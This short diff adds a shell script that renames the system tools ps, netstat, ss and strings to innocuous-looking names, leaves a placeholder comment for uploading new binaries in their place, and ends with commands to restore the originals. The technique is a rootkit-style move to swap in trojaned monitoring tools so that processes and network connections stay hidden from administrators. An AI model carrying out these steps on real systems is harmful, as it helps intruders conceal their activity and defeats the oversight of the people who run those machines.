@@ -1,0 +1,13 @@
+mv /bin/ps /bin/mknodfifo
+mv /bin/netstat /bin/udevmangr
+mv /bin/ss /bin/flood
+mv /usr/bin/strings /usr/bin/settypefc
+
+#upload new binaries
+
+
+#commands to restore to normal
+mv /bin/mknodfifo /bin/ps
+mv /bin/udevmangr /bin/netstat
+mv /bin/flood /bin/ss
+mv /usr/bin/settypefc /usr/bin/strings
